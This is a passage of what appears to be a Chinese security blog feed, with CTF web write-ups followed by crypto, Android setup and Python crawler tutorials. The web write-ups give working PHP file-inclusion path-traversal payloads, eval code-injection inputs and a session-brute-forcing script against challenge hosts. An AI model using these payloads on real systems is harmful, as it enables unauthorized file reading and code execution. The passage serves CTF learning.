<span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span></code></pre><p>利用方法其实有两种，第一种是通过url两次编码的问题然后</p><pre><code>整体的思路就是第一段不出现?，第二段又要出现?。所以进行二次urlencode编码， %253f浏览器会自动解码一次变成%3f，再经过代码的urldecode()变成?。接下来就是文件包含了-但是感觉和直接读取一样的</code></pre><p>paylaod=<code>file=source.php%253f/../../../../ffffllllaaaagggg</code><br>方法二就是用上面的那个漏洞,直接读取</p><pre><code>file=source.php?/../../../../../ffffllllaaaagggg</code></pre><h4 id="“百度杯”CTF比赛-2017-二月场爆破-1"><a href="#“百度杯”CTF比赛-2017-二月场爆破-1" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-1"></a>“百度杯”CTF比赛 2017 二月场爆破-1</h4><p>描述<code>flag就在某六位变量中。</code><br>题目的意思是flag.php中定义了一个flag字符串 我们传递hello如果为那个变量 那个$$a就能把flag丢出来</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\w*$/'</span><span class="token punctuation">,</span><span class="token variable">$a</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'ERROR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>爆破的话贼恶心，所以正确的姿势应该是 <code>hello=GLOBALS</code>,使用超全局变量GLOBALS</p><pre><code>http://138c4d7d85c04385b91b779047d5906d0a331ddc3728405a.changame.ichunqiu.com/?hello=GLOBALS得到[&quot;d3f0f8&quot;]=&gt; string(42) &quot;flag{bfed2cef-1a03-4337-9f55-b00ddbcc5f0a}</code></pre><h4 id="“百度杯”CTF比赛-2017-二月场爆破-2"><a href="#“百度杯”CTF比赛-2017-二月场爆破-2" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-2"></a>“百度杯”CTF比赛 2017 二月场爆破-2</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>payload</p><pre><code>http://4139dc5d40184be4bb481b0d09226223d3815a7b2aea4456.changame.ichunqiu.com/?hello=file_get_contents(&#39;flag.php&#39;)</code></pre><h4 id="“百度杯”CTF比赛-2017-二月场爆破-3"><a href="#“百度杯”CTF比赛-2017-二月场爆破-3" class="headerlink" title="“百度杯”CTF比赛 2017 二月场爆破-3"></a>“百度杯”CTF比赛 2017 二月场爆破-3</h4><p>题目描述:<code>这个真的是爆破</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'./flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'ea'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'time'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">&lt;</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'value'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$str_rand</span> <span class="token operator">=</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_rands</span> <span class="token operator">=</span> <span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$str_rand</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token variable">$str_rands</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'nums'</span><span class="token punctuation">]</span><span class="token operator">>=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这样的题目本地调试最好了<br>其实就是传value要等于<code>$_SESSION[&#39;whoami&#39;]</code>，而后者每次会变，但是会显示出来<br>很沙雕的一点是<code>substr(md5($value),5,4)==0</code>,通过前面<code>$value[0].$value[1]</code>我们知道value是字符串数组，数组的md5是null，和0是弱相等的~所以第一次传<code>?value[0]=e&amp;value[1]=a</code>,会返回两个字符 假设是bq 那就 <code>?value[0]=b&amp;value[1]=q</code>,十次就行，脚本写起来也简单<br>payload</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://9c132b640d22437c940c92547bb4a80f30f6958b40284a36.changame.ichunqiu.com/'</span>session<span class="token operator">=</span>requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>html<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?value[]=ea'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    html<span class="token operator">=</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?value[]='</span><span class="token operator">+</span>html<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">if</span> <span class="token string">'flag{.*}'</span> <span class="token keyword">in</span> html<span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>html<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><img src="31.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年西湖论剑之维吉尼亚和AutoKey的区别</title>
      <link href="/2019/04/09/2019-nian-xi-hu-lun-jian-zhi-wei-ji-ni-ya-he-autokey-de-qu-bie/"/>
      <url>/2019/04/09/2019-nian-xi-hu-lun-jian-zhi-wei-ji-ni-ya-he-autokey-de-qu-bie/</url>
      
        <content type="html"><![CDATA[<h3 id="奇怪的TTL"><a href="#奇怪的TTL" class="headerlink" title="奇怪的TTL"></a>奇怪的TTL</h3><p>题目描述：<br>我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？</p><h4 id="1、数据整理"><a href="#1、数据整理" class="headerlink" title="1、数据整理"></a>1、数据整理</h4><p>附件中给了个文件,发现ttl.txt中的ttl只有4个值63,127,191,255，写出他们的二进制表示后发现只有最高两位不同，把前两位提取出来，然后十六进制转字符串，发现所有字符串都是1<del>9,a</del>f之间,然后自然考虑这是又是十六进制，然后写入文件中。发现写出来的16进制数开头是ffd8,打开是这样的</p><a id="more"></a><p><img src="2.jpg" alt=""></p><p>万物皆可binwalk 放在linux下binwalk分离到6张残图</p><pre><code>foremost 或者binwalk -e</code></pre><p>得到</p><p><img src="3.png" alt=""><br><img src="4.png" alt=""></p><p>扫描得到</p><pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><h4 id="2、然后开始入坑"><a href="#2、然后开始入坑" class="headerlink" title="2、然后开始入坑"></a>2、然后开始入坑</h4><p>一开始以为是维吉尼亚加密，这里解释一下维吉尼亚加密<br>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计<br><img src="1.webp" alt=""></p><pre><code>明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG密钥(循环使用)：CULTURE加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母&#39;T&#39;列和密钥字母&#39;C&#39;行的交点就是密文字母&#39;V&#39;，以此类推。密文：VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></pre><p>然后拿着本题的密钥和密文去解密，得到答案然后gg<br><img src="5.png" alt=""> 其实是AutoKey Cipher，人家在题目里都提示了，只能怪自己太死脑筋和孤陋寡闻</p><h4 id="3、啥·是AutoKey-Cipher"><a href="#3、啥·是AutoKey-Cipher" class="headerlink" title="3、啥·是AutoKey Cipher"></a>3、啥·是AutoKey Cipher</h4><p>其实原理和维吉尼亚基本一致的，但是维吉尼亚当密钥长度小于明文，将会循环使用密钥，而Autokey Cipher当密钥长度不足时，将会开始使用明文的第一个字母开始附加在密钥上。<br>在本题的体现是密钥12位，而密文中字母有14哥所以最后两个需要拿f l 替换<br><a href="https://www.wishingstarmoye.com/ctf/autokey" target="_blank" rel="noopener">AutoKey Cipher在线加解密</a></p><h4 id="4、使用Python3解密"><a href="#4、使用Python3解密" class="headerlink" title="4、使用Python3解密"></a>4、使用Python3解密</h4><h5 id="AutoKey-Cipher"><a href="#AutoKey-Cipher" class="headerlink" title="AutoKey Cipher"></a>AutoKey Cipher</h5><pre><code>&gt;&gt;&gt; from pycipher import Autokey&gt;&gt;&gt; Autokey(&#39;AutomaticKey&#39;).decipher(&#39;fftu{2028mb39927wn1f96o6e12z03j58002p}&#39;)&#39;FLAGABDFDEABEE&#39;&gt;&gt;&gt; Autokey(&#39;AutomaticKey&#39;).encipher(&#39;FLAGABDFDEABEE&#39;)&#39;FFTUMBWNFOEZJP&#39;</code></pre><h6 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h6><pre><code>&gt;&gt;&gt;from pycipher import Vigenere&gt;&gt;&gt;Vigenere(&#39;CULTURE&#39;).encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;&gt;&gt;&gt;Vigenere(&#39;CULTURE&#39;).decipher(&#39;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&#39;&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio踩过的坑</title>
      <link href="/2019/04/02/android-studio-cai-guo-de-keng/"/>
      <url>/2019/04/02/android-studio-cai-guo-de-keng/</url>
      
        <content type="html"><![CDATA[<h4 id="最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的"><a href="#最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的" class="headerlink" title="最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的"></a>最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的</h4><h4 id="坑1、Unable-to-access-Android-SDK-add-on-list"><a href="#坑1、Unable-to-access-Android-SDK-add-on-list" class="headerlink" title="坑1、Unable to access Android SDK add-on list"></a>坑1、Unable to access Android SDK add-on list</h4><p><img src="2.png" alt=""><br>很好奇，为什么安装android studio的时候不直接帮忙装个SDK，非要先装个空壳然后单独下SDK，当然这服务于一些电脑已经装过SDK的同志，但是我觉得在安装AS的时候应该给个选项什么的吧<br>解决办法-就是下载咯</p><a id="more"></a><p><img src="3.png" alt=""><br>然后选择一个位置下就行（为什么是坑呢，因为300m的东西，用我航校园网下了3个小时，后来换流量1分钟就结束了！！！阿伟死了）</p><h4 id="坑2、第一次启动AS的时候配置一写Gradle服务"><a href="#坑2、第一次启动AS的时候配置一写Gradle服务" class="headerlink" title="坑2、第一次启动AS的时候配置一写Gradle服务"></a>坑2、第一次启动AS的时候配置一写Gradle服务</h4><p>第一次打开是这样滴<br><img src="4.png" alt=""><br>看似一切正常，但是你等啊等等阿等，酒喝完了，烟抽完了，还在提示还在下载gradle-XXX-all.zip<br><strong>这一次不是网络问题了。因为流量也贼慢</strong><br>其实AS做的操作就是网上下个包到/.gradle/wrapper/dist/graXX/<br>至于速度为什么这么慢，还真不知道<br><strong>解决办法</strong>：自行下载一个.zip然后放进来（由于上一次下载中止，这个文件夹下会有些其他的垃圾文件，你可以先删除，只留下.zip,然后重启！！一定要重启，然后AS会自动解压使用！<br><a href="http://services.gradle.org/distributions/" target="_blank" rel="noopener">gradle下载地址传送门</a><br><img src="1.png" alt=""></p><h3 id="活着挺好的，为什么要学安卓开发"><a href="#活着挺好的，为什么要学安卓开发" class="headerlink" title="活着挺好的，为什么要学安卓开发"></a>活着挺好的，为什么要学安卓开发</h3>]]></content>
      
      
      <categories>
          
          <category> 雁儿几度恋开发-愿得一站入万家 </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>精通Python网络爬虫-四五章基本使用</title>
      <link href="/2019/03/21/jing-tong-python-wang-luo-pa-chong-san-si-zhang-ji-ben-shi-yong/"/>
      <url>/2019/03/21/jing-tong-python-wang-luo-pa-chong-san-si-zhang-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<h3 id="一、时代变迁下的比较"><a href="#一、时代变迁下的比较" class="headerlink" title="一、时代变迁下的比较:"></a>一、时代变迁下的比较:</h3><table><thead><tr><th>Python2.x时代</th><th>Python3.x时代</th></tr></thead><tbody><tr><td>import urllib2</td><td>import urllib.request,urllib.error</td></tr><tr><td>import urllib</td><td>import urllib2.request,urllib.error,urllib.parse</td></tr><tr><td>import urlparse</td><td>import urllib.parse</td></tr><tr><td>urllib2.urlopen</td><td>urllib.request.urlopen</td></tr><tr><td>urllib.urlencode</td><td>urllib.parse.urlencode</td></tr><tr><td>urllib.quote</td><td>urllib.request.quote</td></tr><tr><td>cookielib.CookieJar</td><td>http.CookieJar</td></tr><tr><td>urllib2.Request</td><td>urllib.request.Request</td></tr><tr><td><a id="more"></a></td><td></td></tr><tr><td>#### 1.1、快速使用</td><td></td></tr><tr><td>```</td><td></td></tr><tr><td>//导入模块</td><td></td></tr></tbody></table><blockquote><blockquote><blockquote><p>import urllib.request<br>//打开网页<br>file=urllib.request.urlopen(“<a href="http://baidu.com&quot;" target="_blank" rel="noopener">http://baidu.com&quot;</a>)<br>//读取全部内容.内容赋给字符串变量<br>data=file.read()<br>//读取全部内容，内容赋给列表变量<br>data=file.readlines()<br>//读取一行内容<br>dataline=file.readline()<br>print dataline<br>print data<br>print(file.info())<br>print(file.getcode())<br>print(file.geturl())</p></blockquote></blockquote></blockquote><pre><code>URL标准中一般只允许一部分ASCII字符，如数字、字母、部分符号等。若是特殊字符，如中文、：、或者&amp;等，需要编码。编码格式：</code></pre><p>urllib.request.quote(“<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">http://www.baidu.com&quot;</a>)<br>urllib.request.unquote(“http%3A//<a href="http://www.baidu.com&quot;" target="_blank" rel="noopener">www.baidu.com&quot;</a>)</p><pre><code>保存本地方法1</code></pre><blockquote><blockquote><blockquote><p>fhandle=open(“demo.html”)<br>fhandle.write(data)<br>fhandle.close()</p></blockquote></blockquote></blockquote><pre><code>保存本地方法2</code></pre><p>filename=urllib.request.urlretrieve(“<a href="http://www.baidu.com&quot;,filename=&quot;demo.html&quot;" target="_blank" rel="noopener">http://www.baidu.com&quot;,filename=&quot;demo.html&quot;</a>)</p><pre><code>#### 1.2、模拟浏览器 -- Headers 属性方法1、build_opener()修改报头</code></pre><p>import urllib.request<br>url=”<a href="http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;" target="_blank" rel="noopener">http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;</a><br>headers=(“User-Agent”,”Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36”)<br>opener = urllib.request.build_opener()<br>opener.addheaders = [headers]<br>data = opener.open(url).read()<br>print(data)</p><pre><code>方法2、用add_header()添加报头</code></pre><p>import urllib.request<br>url=”<a href="http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;" target="_blank" rel="noopener">http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;</a><br>req=urllib.request.Request(url)<br>req.add_header(“User-Agent”,”Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36”)<br>data = urllib.request.urlopen(req).read()</p><pre><code>#### 1.3、超时设置,比如gayhun   </code></pre><p>import urllib.request<br>for i in range(1,100):<br>    try:<br>        file = urllib.request.urlopen(“<a href="https://github.com/&quot;,timeout=1" target="_blank" rel="noopener">https://github.com/&quot;,timeout=1</a>)<br>        data = file.read()<br>        print(len(data))<br>    except Exception as e:<br>        print(“出现异常–&gt;”+str(e))</p><pre><code>#### 1.4、POST请求</code></pre><p>import urllib.request<br>import urllib.parse<br>url = “<a href="http://www.iqianyue.com/mypost&quot;" target="_blank" rel="noopener">http://www.iqianyue.com/mypost&quot;</a><br>postdata = urllib.parse.urlencode({<br>“name”:”Kitty”,<br>“pass”:”haha”<br>}).encode(“utf-8”)<br>req = urllib.request.Request(url,postdata)<br>req.add_header(“User-Agent”,”Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36”)<br>data = urllib.request.urlopen(req).read().decode(‘utf-8’)<br>print(data)</p><pre><code>### 二、异常处理#### 2.1、DebugLog开启</code></pre><p>import urllib.request<br>httphd=urllib.request.HTTPHandler(debuglevel=1)<br>httpshd=urllib.request.HTTPSHandler(debuglevel=1)<br>opener=urllib.request.build_opener(httphd,httpshd)<br>urllib.request.install_opener(opener)<br>data=urllib.request.urlopen(“<a href="http://edu.51cto.com&quot;" target="_blank" rel="noopener">http://edu.51cto.com&quot;</a>)<br>print(data)</p><pre><code>#### 2.2、URLError</code></pre><p>import urllib.request<br>import urllib.error<br>try:<br>    file=urllib.request.urlopen(“<a href="http://www.baiduddd.com&quot;" target="_blank" rel="noopener">http://www.baiduddd.com&quot;</a>)<br>    print(file.read())<br>except urllib.error.URLError as e:<br>    if hasattr(e,”code”):<br>        print(e.code)<br>    if hasattr(e,”reason”):<br>        print(e.reason)</p><h1 id="except-urllib-error-URLError-as-e"><a href="#except-urllib-error-URLError-as-e" class="headerlink" title="except urllib.error.URLError as e:"></a>except urllib.error.URLError as e:</h1><h1 id="print-e-reason"><a href="#print-e-reason" class="headerlink" title="print(e.reason)"></a>print(e.reason)</h1><h1 id="except-urllib-error-HTTPError-as-e"><a href="#except-urllib-error-HTTPError-as-e" class="headerlink" title="except urllib.error.HTTPError as e:"></a>except urllib.error.HTTPError as e:</h1><h1 id="print-e-code"><a href="#print-e-code" class="headerlink" title="print(e.code)"></a>print(e.code)</h1><h1 id="print-e-reason-1"><a href="#print-e-reason-1" class="headerlink" title="print(e.reason)"></a>print(e.reason)</h1><pre><code>### 三、正则表达式的使用如果对正则表达式没概念，请移步[正则表达式必知必会](/2019/01/15/正则表达式必知必会/)#### 3.1、正则表达式常用的功能函数包括：match、search、findall、sub##### 1、1、re.match()函数函数语法：</code></pre><p>re.match(pattern, string, flags=0)</p><pre><code></code></pre><p> def match(pattern, string, flags=0):<br>     “””Try to apply the pattern at the start of the string, returning<br>     a match object, or None if no match was found.”””<br>     return _compile(pattern, flags).match(string)</p><pre><code>函数参数说明：* pattern：匹配的正则表达式* string：要匹配的字符串* flag：标志位，用于控制正则表达式的匹配方式（是否匹配大小写、多行匹配等）作用：match()函数只在字符串的开始位置尝试匹配正则表达式，即从位置0开始匹配。如果匹配成功，则返回一个匹配的对象；如果字符串开始不符合正则表达式，则匹配失败，函数返回None。</code></pre><p>import  re<br>test = ‘<a href="http://news.163.com/17/0624/10/CNMHVBJP0001899N.html&#39;" target="_blank" rel="noopener">http://news.163.com/17/0624/10/CNMHVBJP0001899N.html&#39;</a><br>print(re.match(r’http’,test)) # &lt;_sre.SRE_Match object; span=(0, 4), match=’http’&gt;<br>print(re.match(r’news’,test)) # None</p><pre><code>##### 2、re.search()函数函数语法：</code></pre><p>1 re.search(pattern, string[, flags])</p><pre><code></code></pre><p>1 def search(pattern, string, flags=0):<br>2     “””Scan through string looking for a match to the pattern, returning<br>3     a match object, or None if no match was found.”””<br>4     return _compile(pattern, flags).search(string)</p><pre><code>re.search()匹配整个字符串，直到找到第一个匹配的，如果字符串中没有匹配的，则返回None。</code></pre><p>1 import  re<br>2 test = ‘I am a loving child to learn.’<br>3 print(re.search(r’I’,test)) # &lt;_sre.SRE_Match object; span=(0, 1), match=’I’&gt;<br>4 print(re.search(r’learn’,test)) # &lt;_sre.SRE_Match object; span=(23, 28), match=’learn’&gt;<br>5 print(re.search(r’alina’,test)) # None</p><pre><code>##### 3、re.sub()函数函数语法：</code></pre><p>1 re.sub(pattern,repl,string,count,flags)</p><pre><code></code></pre><p>1 def sub(pattern, repl, string, count=0, flags=0):<br>2     “””Return the string obtained by replacing the leftmost<br>3     non-overlapping occurrences of the pattern in string by the<br>4     replacement repl.  repl can be either a string or a callable;<br>5     if a string, backslash escapes in it are processed.  If it is<br>6     a callable, it’s passed the match object and must return<br>7     a replacement string to be used.”””<br>8     return _compile(pattern, flags).sub(repl, string, count)</p><pre><code>函数参数说明：* pattern：匹配的正则表达式* repl：替换的字符串* String：要被查找替换的原始字符串* count：匹配后替换的最大次数，默认0表示途欢所有的匹配* re.sub()函数用于替换字符串中的匹配项。</code></pre><p>1 import re<br>2 test = ‘I am a loving child to learn.’<br>3 print(re.sub(r’child’,’MMMMM’,test)) # 替换字符串，将child 替换成MMMMM</p><pre><code>##### 4、re.findall()函数函数语法：</code></pre><p>1 re.findall(pattern,string,flags)</p><pre><code></code></pre><p>1 def findall(pattern, string, 